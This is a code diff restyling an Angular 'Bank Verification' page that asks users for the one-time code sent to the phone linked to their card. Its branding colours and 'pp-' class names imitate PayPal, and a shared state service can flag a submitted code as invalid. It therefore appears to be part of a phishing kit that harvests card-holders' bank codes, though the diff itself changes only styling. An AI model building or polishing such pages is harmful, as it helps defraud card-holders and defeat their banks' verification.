@@ -11,44 +11,39 @@ import { StateService } from '../services/state.service';
   imports: [CommonModule, FormsModule, PublicLayoutComponent],
   template: `
     <app-public-layout>
-      <div class="flex flex-col items-center mb-6">
-        <div class="bg-blue-50 text-[#0070ba] text-[11px] font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-5 border border-blue-100">
+      <div class="flex flex-col items-center mb-8">
+        <div class="bg-blue-50 text-pp-blue text-[11px] font-bold px-3 py-1 rounded-full uppercase tracking-wider mb-5 border border-blue-100 animate-fade-in">
            Bank Verification
         </div>
-        <h1 class="text-xl font-bold text-[#2c2e2f] mb-2 text-center">Confirm with your bank</h1>
-        <p class="text-sm text-[#5e6c75] text-center px-4">
+        <h1 class="text-xl font-bold text-pp-navy mb-2 text-center tracking-tight">Confirm with your bank</h1>
+        <p class="text-base text-slate-500 text-center px-4 max-w-xs leading-relaxed">
            We've sent a code to the mobile number registered with your card ending in •••• {{ last4() }}.
         </p>
       </div>
 
       <!-- Feedback -->
       @if (state.rejectionReason()) {
-        <div class="mb-6 bg-[#fff4f4] border-l-4 border-[#d92d20] p-4 flex items-start gap-3 animate-in fade-in slide-in-from-top-2">
-            <span class="material-icons text-[#d92d20] text-xl mt-0.5">error_outline</span>
+        <div class="mb-6 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg animate-in fade-in slide-in-from-top-2">
+            <span class="material-icons text-[#D92D20] text-xl">error_outline</span>
             <div>
-              <p class="text-sm font-bold text-[#2c2e2f]">Invalid Code</p>
-              <p class="text-xs text-[#5e6c75]">Please check the code and try again.</p>
+              <p class="text-sm font-bold text-pp-navy">Invalid Code</p>
+              <p class="text-xs text-slate-600 mt-1">Please check the code and try again.</p>
             </div>
         </div>
       }
 
-      <div class="space-y-6">
-        <div class="relative group">
+      <div class="space-y-8">
+        <div class="pp-input-group">
             <input 
               type="text" 
               [(ngModel)]="otp"
               (input)="onInput($event)"
               id="otp"
               placeholder=" "
-              class="peer w-full px-4 pt-6 pb-2 rounded border transition-all duration-300 shadow-input focus:scale-[1.01] focus:shadow-input-focus outline-none bg-white text-[#2c2e2f] text-center tracking-[0.5em] font-mono font-bold text-lg"
-              [class.border-[#d92d20]]="state.rejectionReason()"
-              [class.border-[#0070ba]]="!state.rejectionReason() && otp.length > 0"
-              [class.border-[#9da3a6]]="!state.rejectionReason() && otp.length === 0"
+              class="pp-input peer text-center tracking-[0.5em] font-mono font-bold text-lg"
+              [class.shadow-input-error]="state.rejectionReason()"
             />
-            <label 
-               for="otp" 
-               class="absolute left-1/2 -translate-x-1/2 top-4 text-[#5e6c75] text-base transition-all duration-200 peer-placeholder-shown:top-4 peer-placeholder-shown:text-base peer-focus:top-1.5 peer-focus:text-[11px] peer-focus:font-semibold peer-[&:not(:placeholder-shown)]:top-1.5 peer-[&:not(:placeholder-shown)]:text-[11px] peer-[&:not(:placeholder-shown)]:font-semibold cursor-text bg-white px-2 pointer-events-none"
-               >
+            <label for="otp" class="pp-label left-1/2 -translate-x-1/2 w-auto bg-white px-2">
                Enter Bank Code
             </label>
         </div>
@@ -57,17 +52,17 @@ import { StateService } from '../services/state.service';
           (click)="submit()"
           [disabled]="otp.length < 4"
           [class.opacity-50]="otp.length < 4"
-          class="w-full bg-[#003087] hover:bg-[#002569] text-white font-bold py-3.5 px-4 rounded-full transition-all duration-300 shadow-md hover:scale-[1.02] active:scale-[0.98]"
+          class="pp-btn"
         >
           Verify
         </button>
 
         <div class="text-center">
-            <p class="text-xs text-[#5e6c75] mb-2">Didn't receive a code?</p>
+            <p class="text-xs text-slate-500 mb-2 font-bold">Didn't receive a code?</p>
             <button 
                 (click)="resend()"
                 [disabled]="timer() > 0"
-                class="text-[#0070ba] font-bold text-sm hover:underline disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed">
+                class="text-pp-blue font-bold text-sm hover:underline hover:text-pp-navy disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed transition-colors">
                 {{ timer() > 0 ? 'Resend available in ' + timer() + 's' : 'Resend Code' }}
             </button>
         </div>
